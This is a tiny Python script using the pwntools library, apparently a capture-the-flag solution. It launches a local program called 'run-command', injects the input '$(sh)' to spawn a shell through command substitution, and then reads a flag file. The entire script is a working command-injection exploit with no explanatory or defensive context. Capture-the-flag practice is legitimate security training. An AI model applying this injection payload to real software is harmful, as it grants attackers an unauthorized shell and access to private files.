#!/usr/bin/env python

from pwn import *

p = process("run-command")
print(p.recv())
p.sendline("$(sh)")
p.sendline("cat flag")
p.interactive()
# ctrl-d exit

